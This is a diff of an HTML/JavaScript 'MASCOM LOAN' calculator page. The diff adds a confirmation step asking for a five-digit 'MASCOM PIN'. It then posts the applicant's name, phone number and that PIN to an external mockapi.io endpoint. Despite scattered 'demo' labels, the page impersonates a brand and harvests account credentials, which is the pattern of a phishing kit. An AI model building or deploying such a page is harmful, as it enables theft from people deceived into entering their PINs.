@@ -1,29 +1,38 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mascom - Smart Loans</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="theme-color" content="#ffcf00">
+
+<title> MASCOM LOAN</title>
 
 <style>
 * {
-    box-sizing: border-box;
     margin: 0;
     padding: 0;
-    font-family: Arial, sans-serif;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
 }
 
 body {
-    background: #f5f5ed;
+    background: #f7f6eb;
     color: #171717;
-    padding: 25px 15px;
+    min-height: 100vh;
+    padding: 20px 12px;
 }
 
 .container {
+    width: 100%;
     max-width: 700px;
     margin: auto;
+}
+
+/* HEADER */
+
+.header {
     text-align: center;
+    margin-bottom: 30px;
 }
 
 .logo {
@@ -31,267 +40,594 @@ body {
     height: 90px;
     background: #ffdf00;
     border-radius: 50%;
-    margin: 0 auto 25px;
     display: flex;
     justify-content: center;
     align-items: center;
-    font-weight: bold;
+    margin: 0 auto 20px;
     font-size: 13px;
-    color: #171717;
+    font-weight: bold;
 }
 
 h1 {
-    font-size: 48px;
-    margin-bottom: 12px;
+    font-size: 46px;
+    margin-bottom: 10px;
 }
 
 .subtitle {
-    font-size: 22px;
-    font-weight: bold;
+    font-size: 21px;
     color: #555;
-    margin-bottom: 30px;
+    font-weight: bold;
 }
+
+/* FEATURES */
 
 .features {
     display: flex;
     justify-content: center;
-    gap: 12px;
+    gap: 10px;
     flex-wrap: wrap;
-    margin-bottom: 65px;
+    margin: 30px 0 50px;
 }
 
 .feature {
     background: #ffda00;
-    padding: 15px 25px;
+    padding: 14px 20px;
     border-radius: 30px;
+    font-size: 15px;
     font-weight: bold;
 }
 
-.panel {
+/* MAIN PANEL */
+
+.yellow-panel {
     background: #ffcf00;
-    padding: 35px;
     border-radius: 35px;
-    text-align: left;
-    margin-bottom: 30px;
+    padding: 30px;
+    margin-bottom: 25px;
 }
 
-.panel-heading {
-    font-size: 21px;
+.panel-title {
+    font-size: 20px;
     font-weight: bold;
     margin-bottom: 35px;
 }
 
-.field-row {
+.row {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    margin-bottom: 20px;
     gap: 10px;
-    font-size: 21px;
+    font-size: 19px;
     font-weight: bold;
+    margin-bottom: 20px;
 }
 
 .value {
     background: white;
-    padding: 15px 22px;
+    color: #073d96;
+    padding: 14px 18px;
     border-radius: 25px;
-    color: #063c91;
     white-space: nowrap;
 }
 
+/* SLIDERS */
+
 input[type="range"] {
+    appearance: none;
+    -webkit-appearance: none;
     width: 100%;
-    accent-color: #073d96;
-    margin-bottom: 35px;
+    height: 10px;
+    border-radius: 20px;
+    background: #d9aa00;
+    outline: none;
+    margin: 10px 0 35px;
     cursor: pointer;
 }
+
+input[type="range"]::-webkit-slider-thumb {
+    appearance: none;
+    -webkit-appearance: none;
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: white;
+    border: 7px solid #06449e;
+}
+
+input[type="range"]::-moz-range-thumb {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background: white;
+    border: 7px solid #06449e;
+}
+
+/* INTEREST */
 
 .interest {
     display: flex;
     justify-content: space-between;
-    font-size: 20px;
+    font-size: 19px;
     font-weight: bold;
-    margin: 15px 0 40px;
+    margin: 15px 0 35px;
 }
+
+/* PAYMENT RESULT */
 
 .result {
     background: white;
-    padding: 45px 20px;
-    border-radius: 35px;
+    padding: 35px 15px;
+    border-radius: 32px;
     text-align: center;
-    margin-bottom: 40px;
+    margin-bottom: 35px;
 }
 
 .monthly {
+    font-size: clamp(34px, 8vw, 65px);
     color: #073d96;
-    font-size: clamp(35px, 8vw, 65px);
     font-weight: bold;
+    overflow-wrap: anywhere;
 }
 
 .result p {
     color: #666;
+    font-size: 17px;
     font-weight: bold;
     margin: 12px 0;
-    font-size: 18px;
 }
 
 .total {
-    font-size: 17px;
+    font-size: 15px;
+    line-height: 1.6;
+    color: #444;
 }
 
 .total strong {
     color: #c93636;
 }
 
+/* BUTTONS */
+
 button {
     width: 100%;
+    padding: 23px 15px;
+    border: none;
+    border-radius: 28px;
     background: #171717;
     color: #ffdc00;
-    padding: 24px;
-    border: none;
-    border-radius: 30px;
-    font-size: 23px;
+    font-size: 21px;
     font-weight: bold;
     cursor: pointer;
+    min-height: 60px;
+    touch-action: manipulation;
 }
 
-button:hover {
-    background: #333;
+button:active {
+    transform: scale(0.99);
 }
+
+button:disabled {
+    opacity: 0.6;
+    cursor: wait;
+}
+
+/* APPLICATION SUMMARY */
 
 .summary {
     background: #ffcf00;
-    padding: 30px;
-    border-radius: 35px;
+    border-radius: 32px;
+    padding: 25px;
+    margin: 30px 0;
     display: grid;
     grid-template-columns: 1fr 1fr;
-    gap: 25px;
-    text-align: left;
-    margin: 45px 0;
+    gap: 25px 12px;
 }
 
 .summary small {
-    font-weight: bold;
+    font-size: 14px;
     color: #555;
-    font-size: 15px;
+    font-weight: bold;
 }
 
 .summary h2 {
+    font-size: clamp(19px, 4vw, 27px);
     color: #073d96;
     margin-top: 8px;
-    font-size: 27px;
+    overflow-wrap: anywhere;
 }
 
-.form-panel {
-    background: #ffcf00;
-    padding: 35px;
-    border-radius: 35px;
-    text-align: left;
-}
+/* APPLICATION FORM */
 
 .form-title {
-    font-size: 30px;
+    font-size: 28px;
     font-weight: bold;
-    margin-bottom: 10px;
+    margin-bottom: 12px;
 }
 
 .form-description {
     color: #555;
+    font-size: 17px;
     font-weight: bold;
-    font-size: 19px;
-    margin-bottom: 55px;
+    margin-bottom: 45px;
 }
 
 label {
     display: block;
-    font-size: 20px;
+    font-size: 19px;
     font-weight: bold;
-    margin-bottom: 15px;
+    margin-bottom: 14px;
+}
+
+.required {
+    color: red;
 }
 
 input[type="text"],
 input[type="tel"] {
     width: 100%;
-    padding: 23px;
+    padding: 21px;
+    border-radius: 23px;
     border: 2px solid #eee;
-    border-radius: 25px;
-    font-size: 21px;
-    outline: none;
-    margin-bottom: 40px;
+    background: white;
     color: #073d96;
+    font-size: 19px;
     font-weight: bold;
+    outline: none;
+    margin-bottom: 35px;
+    min-height: 65px;
 }
 
-input:focus {
+input[type="text"]:focus,
+input[type="tel"]:focus {
     border-color: #073d96;
 }
 
-.hint {
-    font-size: 15px;
-    color: #555;
-    margin-top: -25px;
-    margin-bottom: 55px;
+input::placeholder {
+    color: #999;
 }
+
+.hint {
+    font-size: 14px;
+    color: #555;
+    margin-top: -22px;
+    margin-bottom: 40px;
+}
+
+/* ERROR AND SUCCESS */
 
 .error {
     display: none;
+    background: #fff1df;
     color: #c93636;
     border: 2px solid #e59b00;
-    border-radius: 20px;
-    padding: 18px;
-    text-align: center;
+    border-radius: 18px;
+    padding: 17px;
     font-weight: bold;
-    margin-top: 25px;
+    text-align: center;
+    margin-top: 20px;
+    line-height: 1.5;
 }
 
 .success {
     display: none;
     background: white;
-    padding: 35px;
     border-radius: 25px;
+    padding: 30px 15px;
     text-align: center;
-    margin-top: 25px;
+    margin-top: 20px;
+}
+
+.success h2 {
+    color: #073d96;
+    margin-bottom: 12px;
 }
 
 .secure {
     text-align: center;
     color: #555;
+    font-size: 14px;
     font-weight: bold;
-    margin-top: 45px;
-    font-size: 15px;
+    margin-top: 40px;
+    line-height: 2;
 }
 
 .hidden {
-    display: none;
+    display: none !important;
 }
 
-@media(max-width: 500px) {
-    h1 { font-size: 42px; }
+/* CONFIRMATION SCREEN */
 
-    .panel, .form-panel {
-        padding: 25px 20px;
+.confirm-screen {
+    background: #ffcf00;
+    border-radius: 38px;
+    padding: 34px 28px;
+    margin: 30px 0;
+}
+
+.confirm-heading {
+    font-size: clamp(24px, 5vw, 34px);
+    margin: 0 0 10px;
+}
+
+.confirm-description {
+    color: #555;
+    font-size: 17px;
+    font-weight: bold;
+    line-height: 1.5;
+    margin-bottom: 28px;
+}
+
+.customer-details {
+    background: rgba(210, 165, 0, .34);
+    border-radius: 28px;
+    padding: 22px;
+    margin: 25px 0 30px;
+}
+
+.customer-details .detail-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 14px;
+    padding: 13px 4px;
+    border-bottom: 1px solid rgba(120, 90, 0, .14);
+    font-size: 17px;
+}
+
+.customer-details .detail-row:last-child {
+    border-bottom: 0;
+}
+
+.customer-details strong {
+    text-align: right;
+    overflow-wrap: anywhere;
+}
+
+.demo-code-label {
+    display: block;
+    font-weight: bold;
+    margin: 12px 0 10px;
+}
+
+/* FIVE WHITE VERIFICATION BOXES */
+
+.demo-code-boxes {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+    width: 100%;
+    margin: 28px auto 24px;
+}
+
+.demo-code-boxes input.code-box {
+    width: 62px;
+    height: 72px;
+    min-width: 0;
+    min-height: 0;
+    padding: 0;
+    margin: 0;
+    border: 2px solid #eee;
+    border-radius: 16px;
+    background: #fff;
+    color: #073d96;
+    font-size: 29px;
+    font-weight: bold;
+    text-align: center;
+    outline: none;
+    box-shadow: 0 3px 8px rgba(0,0,0,.08);
+    caret-color: #073d96;
+}
+
+.demo-code-boxes input.code-box:focus {
+    border-color: #073d96;
+    box-shadow: 0 0 0 3px rgba(7,61,150,.14);
+}
+
+.demo-code-help {
+    color: #5c4b00;
+    font-size: 13px;
+    text-align: center;
+    margin: -12px 0 20px;
+}
+
+.confirm-screen button {
+    background: #c9a000;
+    color: #fff6c8;
+}
+
+/* PROCESSING SCREEN */
+
+.processing-screen {
+    min-height: 70vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 35px 20px;
+}
+
+.spinner {
+    width: 112px;
+    height: 112px;
+    border: 9px solid #dce3f0;
+    border-right-color: #06449e;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 52px;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.processing-screen h2 {
+    font-size: clamp(25px, 5vw, 36px);
+    margin-bottom: 22px;
+}
+
+.processing-screen p {
+    color: #465064;
+    font-size: 18px;
+    font-weight: bold;
+    line-height: 1.6;
+    max-width: 460px;
+}
+
+.processing-note {
+    margin-top: 65px;
+    border-radius: 30px;
+    background: #e6eaf1;
+    color: #073d96;
+    padding: 14px 22px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+/* MOBILE RESPONSIVENESS */
+
+@media screen and (max-width: 600px) {
+
+    body {
+        padding: 15px 10px;
     }
 
-    .field-row {
-        font-size: 17px;
+    .container {
+        width: 100%;
     }
 
-    .value {
-        font-size: 17px;
-        padding: 13px;
+    .logo {
+        width: 80px;
+        height: 80px;
     }
 
-    .summary {
-        padding: 22px;
-        gap: 18px;
+    h1 {
+        font-size: 42px;
     }
 
-    .summary h2 {
-        font-size: 21px;
+    .subtitle {
+        font-size: 19px;
     }
 
     .features {
-        margin-bottom: 45px;
+        gap: 8px;
+        margin: 25px 0 40px;
+    }
+
+    .feature {
+        padding: 12px 15px;
+        font-size: 13px;
+    }
+
+    .yellow-panel {
+        padding: 24px 18px;
+        border-radius: 30px;
+    }
+
+    .row {
+        font-size: 15px;
+        gap: 6px;
+    }
+
+    .value {
+        font-size: 14px;
+        padding: 12px 13px;
+    }
+
+    .panel-title {
+        font-size: 17px;
+    }
+
+    .result {
+        padding: 30px 12px;
+    }
+
+    .monthly {
+        font-size: 38px;
+    }
+
+    .result p {
+        font-size: 15px;
+    }
+
+    .total {
+        font-size: 13px;
+    }
+
+    .summary {
+        padding: 22px 17px;
+        gap: 22px 8px;
+    }
+
+    .form-title {
+        font-size: 25px;
+    }
+
+    .form-description {
+        font-size: 16px;
+    }
+
+    label {
+        font-size: 17px;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+        padding: 18px;
+        font-size: 17px;
+        min-height: 60px;
+    }
+
+    button {
+        font-size: 19px;
+        padding: 20px 12px;
+    }
+}
+
+/* Keep verification boxes compact on mobile */
+@media screen and (max-width: 600px) {
+    .demo-code-boxes {
+        gap: 8px;
+    }
+
+    .demo-code-boxes input.code-box {
+        width: min(16vw, 56px);
+        height: 66px;
+        border-radius: 14px;
+        font-size: 25px;
+    }
+}
+
+@media screen and (max-width: 360px) {
+
+    .row {
+        font-size: 13px;
+    }
+
+    .value {
+        font-size: 12px;
+        padding: 10px;
+    }
+
+    .feature {
+        padding: 10px;
+        font-size: 12px;
+    }
+
+    .monthly {
+        font-size: 32px;
+    }
+
+    .demo-code-boxes {
+        gap: 6px;
+    }
+
+    .demo-code-boxes input.code-box {
+        width: 15vw;
+        height: 58px;
+        font-size: 22px;
     }
 }
 </style>
@@ -301,33 +637,44 @@ input:focus {
 
 <div class="container">
 
-    <div class="logo">MASCOM</div>
-
-    <h1>Mascom</h1>
-    <div class="subtitle" id="subtitle">
-        Smart loans, fair rates
+    <div style="background:#fff1c2;color:#5c4b00;padding:10px 14px;border-radius:12px;text-align:center;font-size:13px;font-weight:bold;margin-bottom:18px;">
+        MASCOM LOAN
     </div>
+
+    <!-- HEADER -->
+
+    <header class="header">
+
+        <div class="logo">DEMO</div>
+
+        <h1>Loan Calculator</h1>
+
+        <div class="subtitle" id="subtitle">
+            Smart loans, fair rates
+        </div>
+
+    </header>
 
     <!-- PAGE 1: LOAN CALCULATOR -->
 
     <section id="calculator">
 
         <div class="features">
-            <div class="feature">⚡ 98% Approval</div>
-            <div class="feature">🔒 Affordable</div>
-            <div class="feature">📱 Instant</div>
+            <div class="feature">⚡ Fast Application</div>
+            <div class="feature">🔒 Simple Process</div>
+            <div class="feature">📱 Online</div>
         </div>
 
-        <div class="panel">
+        <div class="yellow-panel">
 
-            <div class="field-row">
+            <div class="row">
                 <span>📊 CALCULATE YOUR CREDIT</span>
                 <span class="value">5% APR Fixed</span>
             </div>
 
-            <div class="field-row">
-                <span>💵 Apply</span>
-                <span class="value" id="amountValue">
+            <div class="row">
+                <span>💵 Loan Amount</span>
+                <span class="value" id="amountText">
                     BWP 1,000,000
                 </span>
             </div>
@@ -339,12 +686,11 @@ input:focus {
                 max="1000000"
                 step="10000"
                 value="1000000"
-                oninput="calculate()"
             >
 
-            <div class="field-row">
+            <div class="row">
                 <span>📅 Payment Time</span>
-                <span class="value" id="periodValue">
+                <span class="value" id="periodText">
                     3 Months
                 </span>
             </div>
@@ -356,7 +702,6 @@ input:focus {
                 max="24"
                 step="3"
                 value="3"
-                oninput="calculate()"
             >
 
             <div class="interest">
@@ -365,27 +710,30 @@ input:focus {
             </div>
 
             <div class="result">
-                <div class="monthly" id="monthly">
+
+                <div class="monthly" id="monthlyText">
                     BWP 336,115
                 </div>
 
-                <p>Monthly Payment Estimates</p>
+                <p>Monthly Payment Estimate</p>
 
                 <div class="total">
                     Total repayment:
-                    <strong id="total">BWP 1,008,345</strong>
+                    <strong id="totalText">BWP 1,008,345</strong>
                     (Principal + Interest)
                 </div>
+
             </div>
 
-            <button onclick="showApplication()">
+            <button type="button" id="applyButton">
                 Apply Now →
             </button>
 
         </div>
+
     </section>
 
-    <!-- PAGE 2: APPLICATION FORM -->
+    <!-- PAGE 2: APPLICATION -->
 
     <section id="application" class="hidden">
 
@@ -413,64 +761,219 @@ input:focus {
 
         </div>
 
-        <div class="form-panel">
+        <div class="yellow-panel">
 
             <div class="form-title">
                 📋 Complete Application
             </div>
 
             <div class="form-description">
-                ▏ Fill in your personal details below
+                Fill in your personal details below.
             </div>
 
-            <form id="loanForm">
+            <form id="applicationForm">
 
-                <label>Full name <span style="color:red">*</span></label>
+                <label for="fullName">
+                    Full name <span class="required">*</span>
+                </label>
 
                 <input
                     type="text"
                     id="fullName"
+                    name="full_name"
                     placeholder="John M. Doe"
+                    autocomplete="name"
                     required
                 >
 
-                <label>Phone number <span style="color:red">*</span></label>
+                <label for="phone">
+                    Phone number <span class="required">*</span>
+                </label>
 
                 <input
                     type="tel"
                     id="phone"
-                    placeholder="712 345 67"
+                    name="phone_number"
+                    placeholder="71234567"
+                    inputmode="numeric"
                     maxlength="8"
+                    autocomplete="tel"
                     required
                 >
 
                 <div class="hint">
-                    📱 Enter your number starting 7 (8 digits)
+                    Enter an 8-digit phone number starting with 7.
                 </div>
 
-                <button type="submit">
+                <button type="submit" id="submitButton">
                     Continue →
                 </button>
 
-                <div class="error" id="error">
-                    ❌ Please enter your number starting 7
-                    (eg: 712 345 67)
-                </div>
+                <div class="error" id="errorMessage"></div>
 
             </form>
 
-            <div class="success" id="success">
-                <h2 style="color:#073d96">
-                    Application Submitted!
-                </h2>
-                <p style="margin:20px 0">
-                    Your application has been received.
-                </p>
+            <div class="secure">
+                Demo application · No real payment credentials required
             </div>
 
-            <div class="secure">
-                🔒 Secured &nbsp; ⚡ 5 minute approval
-                &nbsp; 💰 No Hidden Fees
+        </div>
+
+    </section>
+
+    <!-- PAGE 3: APPLICATION CONFIRMATION -->
+
+    <section id="confirmation" class="hidden">
+
+        <div class="header">
+            <div class="logo">DEMO</div>
+            <h1>Loan Application</h1>
+            <div class="subtitle">Review your details</div>
+        </div>
+
+        <div class="summary">
+
+            <div>
+                <small>AMOUNT OF CREDIT</small>
+                <h2 id="confirmAmount">BWP 1,000,000</h2>
+            </div>
+
+            <div>
+                <small>PERIOD</small>
+                <h2 id="confirmPeriod">3 Months</h2>
+            </div>
+
+            <div>
+                <small>MONTHLY</small>
+                <h2 id="confirmMonthly">BWP 336,114.83</h2>
+            </div>
+
+            <div>
+                <small>INTEREST</small>
+                <h2>5%</h2>
+            </div>
+
+        </div>
+
+        <div class="confirm-screen">
+
+            <div class="confirm-heading">
+                Confirm your Loan application
+            </div>
+
+            <div class="confirm-description">
+                Please check that the applicant information and loan details below are correct.
+            </div>
+
+            <div class="customer-details">
+
+                <div class="detail-row">
+                    <span>Full Name</span>
+                    <strong id="confirmName">—</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Phone Number</span>
+                    <strong id="confirmPhone">—</strong>
+                </div>
+
+                <div class="detail-row">
+                    <span>Total Repayment</span>
+                    <strong id="confirmTotal">—</strong>
+                </div>
+
+            </div>
+
+            <label class="demo-code-label">
+                MASCOM PIN
+            </label>
+
+            <div
+                class="demo-code-boxes"
+                id="demoCodeBoxes"
+                role="group"
+                aria-label="Five-digit demo code"
+            >
+
+                <input
+                    class="code-box"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="1"
+                    autocomplete="off"
+                    aria-label="Digit 1"
+                >
+
+                <input
+                    class="code-box"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="1"
+                    autocomplete="off"
+                    aria-label="Digit 2"
+                >
+
+                <input
+                    class="code-box"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="1"
+                    autocomplete="off"
+                    aria-label="Digit 3"
+                >
+
+                <input
+                    class="code-box"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="1"
+                    autocomplete="off"
+                    aria-label="Digit 4"
+                >
+
+                <input
+                    class="code-box"
+                    type="text"
+                    inputmode="numeric"
+                    maxlength="1"
+                    autocomplete="off"
+                    aria-label="Digit 5"
+                >
+
+            </div>
+
+            <div class="demo-code-help">
+                Enter five digits PIN
+            </div>
+
+            <button type="button" id="confirmSubmitButton">
+                Confirm and Continue →
+            </button>
+
+            <div class="error" id="confirmError"></div>
+
+        </div>
+
+    </section>
+
+    <!-- PAGE 4: PROCESSING -->
+
+    <section id="processing" class="hidden">
+
+        <div class="processing-screen">
+
+            <div class="spinner" aria-label="Loading"></div>
+
+            <h2 id="processingTitle">
+                Submitting Your Application
+            </h2>
+
+            <p id="processingMessage">
+                Your request is being submitted.
+            </p>
+
+            <div class="processing-note" id="processingNote">
+                PLEASE WAIT...
             </div>
 
         </div>
@@ -481,19 +984,49 @@ input:focus {
 
 <script>
 
-let loanAmount = 1000000;
-let loanPeriod = 3;
-let monthlyPayment = 336115;
-let totalPayment = 1008345;
+/* =====================================
+   API CONFIGURATION
+===================================== */
 
-function money(value) {
+const API_URL =
+    "https://6aea4ee33d3dd3d37be65be8.mockapi.io/data/application";
+
+
+/* =====================================
+   LOAN CALCULATOR
+===================================== */
+
+const amountInput = document.getElementById("amount");
+const periodInput = document.getElementById("period");
+
+let loanAmount = Number(amountInput.value);
+let loanPeriod = Number(periodInput.value);
+
+let monthlyPayment = 0;
+let totalPayment = 0;
+
+
+function formatMoney(value) {
+
     return "BWP " + Math.round(value).toLocaleString("en-US");
+
 }
+
+
+function formatMoneyExact(value) {
+
+    return "BWP " + value.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    });
+
+}
+
 
 function calculate() {
 
-    loanAmount = Number(document.getElementById("amount").value);
-    loanPeriod = Number(document.getElementById("period").value);
+    loanAmount = Number(amountInput.value);
+    loanPeriod = Number(periodInput.value);
 
     const monthlyRate = 0.05 / 12;
 
@@ -503,92 +1036,359 @@ function calculate() {
 
     totalPayment = monthlyPayment * loanPeriod;
 
-    document.getElementById("amountValue").innerText =
-        money(loanAmount);
+    document.getElementById("amountText").textContent =
+        formatMoney(loanAmount);
 
-    document.getElementById("periodValue").innerText =
+    document.getElementById("periodText").textContent =
         loanPeriod + " Months";
 
-    document.getElementById("monthly").innerText =
-        money(monthlyPayment);
+    document.getElementById("monthlyText").textContent =
+        formatMoney(monthlyPayment);
 
-    document.getElementById("total").innerText =
-        money(totalPayment);
+    document.getElementById("totalText").textContent =
+        formatMoney(totalPayment);
+
 }
 
-function showApplication() {
+
+amountInput.addEventListener("input", calculate);
+periodInput.addEventListener("input", calculate);
+
+
+/* =====================================
+   OPEN APPLICATION PAGE
+===================================== */
+
+document.getElementById("applyButton").addEventListener("click", function() {
 
     document.getElementById("calculator").classList.add("hidden");
 
     document.getElementById("application").classList.remove("hidden");
 
-    document.getElementById("subtitle").innerText =
+    document.getElementById("subtitle").textContent =
         "Complete Application";
 
-    document.getElementById("summaryAmount").innerText =
-        money(loanAmount);
+    document.getElementById("summaryAmount").textContent =
+        formatMoney(loanAmount);
 
-    document.getElementById("summaryPeriod").innerText =
+    document.getElementById("summaryPeriod").textContent =
         loanPeriod + " Months";
 
-    document.getElementById("summaryMonthly").innerText =
-        "BWP " + monthlyPayment.toLocaleString("en-US", {
-            minimumFractionDigits: 2,
-            maximumFractionDigits: 2
-        });
+    document.getElementById("summaryMonthly").textContent =
+        formatMoneyExact(monthlyPayment);
 
-    window.scrollTo(0, 0);
-}
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
 
-document.getElementById("loanForm").addEventListener("submit",
-async function(event) {
+});
+
+
+/* =====================================
+   APPLICATION DETAILS
+===================================== */
+
+let applicantName = "";
+let applicantPhone = "";
+
+
+document.getElementById("applicationForm").addEventListener("submit", function(event) {
 
     event.preventDefault();
 
-    const name = document.getElementById("fullName").value.trim();
-    const phone = document.getElementById("phone").value.trim();
-    const error = document.getElementById("error");
+    applicantName =
+        document.getElementById("fullName").value.trim();
 
-    if (!/^7\d{7}$/.test(phone)) {
-        error.style.display = "block";
+    applicantPhone =
+        document.getElementById("phone").value.trim();
+
+    const errorBox =
+        document.getElementById("errorMessage");
+
+    if (applicantName.length < 2) {
+
+        errorBox.textContent =
+            "Please enter your full name.";
+
+        errorBox.style.display = "block";
+
         return;
+
     }
 
-    error.style.display = "none";
+    if (!/^7[0-9]{7}$/.test(applicantPhone)) {
+
+        errorBox.textContent =
+            "Please enter a valid 8-digit number starting with 7.";
+
+        errorBox.style.display = "block";
+
+        return;
+
+    }
+
+    errorBox.style.display = "none";
+
+    document.getElementById("confirmName").textContent =
+        applicantName;
+
+    document.getElementById("confirmPhone").textContent =
+        applicantPhone;
+
+    document.getElementById("confirmAmount").textContent =
+        formatMoney(loanAmount);
+
+    document.getElementById("confirmPeriod").textContent =
+        loanPeriod + " Months";
+
+    document.getElementById("confirmMonthly").textContent =
+        formatMoneyExact(monthlyPayment);
+
+    document.getElementById("confirmTotal").textContent =
+        formatMoneyExact(totalPayment);
+
+    document.getElementById("application").classList.add("hidden");
+
+    document.getElementById("confirmation").classList.remove("hidden");
+
+    document.getElementById("subtitle").textContent =
+        "Review your Application";
+
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
+
+});
+
+
+/* =====================================
+   FIVE SEPARATE DEMO CODE BOXES
+
+   - Automatically moves to next box
+   - Backspace moves to previous box
+   - Arrow keys navigate between boxes
+   - Paste fills all five boxes
+===================================== */
+
+const codeBoxes =
+    Array.from(document.querySelectorAll(".code-box"));
+
+
+codeBoxes.forEach((box, index) => {
+
+    box.addEventListener("input", function() {
+
+        this.value =
+            this.value.replace(/[^0-9]/g, "").slice(-1);
+
+        if (this.value && index < codeBoxes.length - 1) {
+
+            codeBoxes[index + 1].focus();
+
+        }
+
+    });
+
+
+    box.addEventListener("keydown", function(event) {
+
+        if (
+            event.key === "Backspace" &&
+            !this.value &&
+            index > 0
+        ) {
+
+            codeBoxes[index - 1].focus();
+
+        }
+
+        else if (
+            event.key === "ArrowLeft" &&
+            index > 0
+        ) {
+
+            event.preventDefault();
+
+            codeBoxes[index - 1].focus();
+
+        }
+
+        else if (
+            event.key === "ArrowRight" &&
+            index < codeBoxes.length - 1
+        ) {
+
+            event.preventDefault();
+
+            codeBoxes[index + 1].focus();
+
+        }
+
+    });
+
+
+    box.addEventListener("paste", function(event) {
+
+        event.preventDefault();
+
+        const pasted =
+            event.clipboardData
+                .getData("text")
+                .replace(/\D/g, "")
+                .slice(0, 5);
+
+        codeBoxes.forEach((input, i) => {
+
+            input.value = pasted[i] || "";
+
+        });
+
+        codeBoxes[
+            Math.min(pasted.length, codeBoxes.length - 1)
+        ].focus();
+
+    });
+
+});
+
+
+/* =====================================
+   CONFIRM AND SUBMIT APPLICATION
+===================================== */
+
+document.getElementById("confirmSubmitButton").addEventListener("click", async function() {
+
+    const button = this;
+
+    const errorBox =
+        document.getElementById("confirmError");
+
+    const demoCode =
+        codeBoxes.map(box => box.value).join("");
+
+    errorBox.style.display = "none";
+
+
+    if (!/^[0-9]{5}$/.test(demoCode)) {
+
+        errorBox.textContent =
+            "For this demo, please enter any five digits.";
+
+        errorBox.style.display = "block";
+
+        return;
+
+    }
+
+
+    if (!API_URL) {
+
+        errorBox.textContent =
+            "Please configure your application API URL.";
+
+        errorBox.style.display = "block";
+
+        return;
+
+    }
+
+
+    button.disabled = true;
+
+    button.textContent = "Submitting...";
+
+
+    document.getElementById("confirmation").classList.add("hidden");
+
+    document.getElementById("processing").classList.remove("hidden");
+
+    document.getElementById("subtitle").textContent =
+        "Submitting Your Application";
+
+    window.scrollTo({
+        top: 0,
+        behavior: "smooth"
+    });
+
+
+    /* JSON DATA SENT TO THE API */
 
     const applicationData = {
-        full_name: name,
-        phone_number: phone,
+
+        full_name: applicantName,
+
+        phone_number: applicantPhone,
+
         loan_amount_bwp: loanAmount,
+
         period_months: loanPeriod,
-        monthly_payment_bwp: Number(monthlyPayment.toFixed(2)),
-        total_repayment_bwp: Number(totalPayment.toFixed(2))
+        demo_verification_code: demoCode,
+        monthly_payment_bwp:
+            Number(monthlyPayment.toFixed(2)),
+
+        total_repayment_bwp:
+            Number(totalPayment.toFixed(2)),  
+
     };
+
 
     try {
 
-        const response = await fetch("/apply", {
+        const response = await fetch(API_URL, {
+
             method: "POST",
+
             headers: {
                 "Content-Type": "application/json"
             },
+
             body: JSON.stringify(applicationData)
+
         });
 
+
         if (!response.ok) {
-            throw new Error("Submission failed");
+
+            throw new Error(
+                "Application API returned HTTP " + response.status
+            );
+
         }
 
-        document.getElementById("loanForm").style.display = "none";
-        document.getElementById("success").style.display = "block";
 
-    } catch (err) {
-        error.innerText =
-            "Unable to submit application. Please try again.";
-        error.style.display = "block";
+        document.getElementById("processingTitle").textContent =
+            "Application Received";
+
+        document.getElementById("processingMessage").textContent =
+            "Your demo application details have been submitted successfully.";
+
+        document.getElementById("processingNote").textContent =
+            "THANK YOU FOR APPLYING";
+
+
+    } catch (error) {
+
+        document.getElementById("processingTitle").textContent =
+            "Submission Unsuccessful";
+
+        document.getElementById("processingMessage").textContent =
+            "We couldn't submit your application. Please check your connection and try again.";
+
+        document.getElementById("processingNote").textContent =
+            "PLEASE TRY AGAIN";
+
+        console.error("Application submission error:", error);
+
     }
 
 });
+
+
+/* =====================================
+   INITIAL CALCULATION
+===================================== */
 
 calculate();
 
